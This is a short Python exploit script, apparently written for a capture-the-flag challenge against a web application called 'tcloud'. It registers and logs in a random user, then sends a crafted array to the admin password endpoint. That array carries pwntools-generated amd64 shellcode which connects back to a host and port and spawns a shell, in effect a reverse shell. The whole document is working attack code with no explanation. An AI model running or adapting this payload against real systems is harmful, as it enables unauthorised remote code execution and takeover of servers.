#!/usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *
import requests
context.arch = "amd64"

url = "http://127.0.0.1/tcloud/"
#url = "http://192.168.201.4/tcloud/"
s = requests.session()

def register(username, password, pin):
    #log.info(username)
    r = s.post(url + "login.php?action=register", data={"username": username, "password": password, "pin": pin})
    assert "Sign up successfully!" in r.content
    #log.success("register successfully")

def login(username, password):
    r = s.post(url + "login.php?action=login", data={"username": username, "password": password})
    assert "Login successfully!" in r.content
    #log.success("login successfully")


sc = asm(shellcraft.linux.connect("localhost", 1234) +
        shellcraft.linux.dup2(7, 0) +
        shellcraft.linux.dup2(7, 1) +
        shellcraft.linux.dup2(7, 2) +
        shellcraft.linux.sh())

username = randoms(10)
password = randoms(10)
pin = randoms(6)

register(username, password, pin)
login(username, password)

r = s.post(url + "admin/?p=password", data={
    "password[]": ["\x20\x52\x60","", sc, "", "\x20\x52\x60"],
    "alias": "\x20\x52\x60", 
    })

